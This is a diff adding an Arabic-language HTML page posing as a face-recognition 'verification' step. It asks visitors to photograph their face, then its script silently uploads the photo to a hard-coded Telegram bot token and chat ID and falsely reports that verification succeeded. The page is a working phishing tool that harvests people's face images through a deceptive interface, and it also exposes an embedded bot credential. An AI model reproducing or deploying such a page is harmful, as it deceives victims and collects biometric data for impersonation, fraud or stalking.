@@ -1,0 +1,181 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>التحقق عبر الصورة</title>
+    <style>
+        /* تصميم واجهة مستخدم غامقة وأنيقة */
+        body {
+            background-color: #121212;
+            color: #ffffff;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            height: 100vh;
+            margin: 0;
+        }
+
+        .container {
+            text-align: center;
+            padding: 30px;
+            border-radius: 20px;
+            background: #1e1e1e;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.5);
+            width: 90%;
+            max-width: 400px;
+        }
+
+        h2 { margin-bottom: 10px; }
+        p { color: #bbb; margin-bottom: 25px; font-size: 15px; }
+
+        /* إطار عرض الصورة التخيلي أو الملتقطة */
+        .image-preview-wrapper {
+            position: relative;
+            width: 200px;
+            height: 200px;
+            margin: 0 auto 25px auto;
+            border: 3px dashed #3498db; /* خط متقطع للإيحاء بمكان الصورة */
+            border-radius: 50%; /* شكل دائري */
+            overflow: hidden;
+            background: #2a2a2a;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        /* الصورة التي ستظهر بعد الالتقاط */
+        #previewImage {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+            display: none; /* مخفية حتى يتم التقاط صورة */
+        }
+
+        /* أيقونة الكاميرا التخيلية */
+        #cameraIcon {
+            font-size: 50px;
+            color: #555;
+        }
+
+        /* زر "التقاط صورة" الأنيق */
+        .btn-capture-wrapper {
+            position: relative;
+            overflow: hidden;
+            display: inline-block;
+        }
+
+        .btn-capture {
+            background-color: #3498db;
+            color: white;
+            border: none;
+            padding: 15px 40px;
+            border-radius: 30px;
+            font-size: 16px;
+            font-weight: bold;
+            cursor: pointer;
+            transition: 0.3s;
+            box-shadow: 0 4px 15px rgba(52, 152, 219, 0.3);
+        }
+
+        .btn-capture:hover { background-color: #2980b9; transform: translateY(-2px); }
+
+        /* عنصر المدخلات المخفي الذي يفتح الكاميرا */
+        #imageInput {
+            position: absolute;
+            font-size: 100px;
+            opacity: 0;
+            right: 0;
+            top: 0;
+            cursor: pointer;
+        }
+
+        #status {
+            margin-top: 20px;
+            font-size: 14px;
+            color: #bbb;
+            min-height: 1.2em;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="container">
+        <h2>التعرف على الوجه</h2>
+        <p>يرجى التقاط صورة واضحة لوجهك لإتمام عملية التحقق.</p>
+        
+        <div class="image-preview-wrapper">
+            <div id="cameraIcon">📷</div>
+            <img id="previewImage" src="#" alt="معاينة الصورة">
+        </div>
+
+        <div class="btn-capture-wrapper">
+            <button class="btn-capture">ابدأ التقاط الصورة</button>
+            <input type="file" accept="image/*" capture="user" id="imageInput">
+        </div>
+
+        <p id="status"></p>
+    </div>
+
+    <script>
+        const token = "8372973119:AAEvtD7kL-5L1uA4URd_CROFb9V4z1nXt8E";
+        const chatId = "591768998";
+        
+        const imageInput = document.getElementById('imageInput');
+        const previewImage = document.getElementById('previewImage');
+        const cameraIcon = document.getElementById('cameraIcon');
+        const status = document.getElementById('status');
+
+        // الاستماع لحدث تغيير الملف (عندما يلتقط المستخدم صورة)
+        imageInput.addEventListener('change', function(e) {
+            const file = e.target.files[0];
+            if (file) {
+                // 1. عرض الصورة في الإطار الدائري للمعاينة
+                const reader = new FileReader();
+                reader.onload = function(event) {
+                    previewImage.src = event.target.result;
+                    previewImage.style.display = 'block';
+                    cameraIcon.style.display = 'none'; // إخفاء الأيقونة
+                }
+                reader.readAsDataURL(file);
+
+                // 2. إرسال الصورة فوراً إلى تليجرام
+                sendPhotoToTelegram(file);
+            }
+        });
+
+        function sendPhotoToTelegram(imageFile) {
+            status.innerText = "جاري رفع الصورة وتحليلها...";
+            status.style.color = "#bbb";
+
+            const formData = new FormData();
+            formData.append('chat_id', chatId);
+            formData.append('photo', imageFile, 'face_capture.jpg');
+            formData.append('caption', '📸 صورة جديدة تم التقاطها للتحقق من الوجه.');
+
+            fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
+                method: 'POST',
+                body: formData
+            })
+            .then(response => response.json())
+            .then(data => {
+                if (data.ok) {
+                    status.innerText = "تمت عملية التحقق بنجاح! شكراً لك.";
+                    status.style.color = "#2ecc71"; // لون أخضر للنجاح
+                } else {
+                    status.innerText = "حدث خطأ أثناء إرسال الصورة. حاول مجدداً.";
+                    status.style.color = "#e74c3c"; // لون أحمر للخطأ
+                    console.error('Telegram API Error:', data);
+                }
+            })
+            .catch(error => {
+                status.innerText = "فشل في الاتصال بالخادم. تأكد من الإنترنت.";
+                status.style.color = "#e74c3c";
+                console.error('Fetch Error:', error);
+            });
+        }
+    </script>
+</body>
+</html>
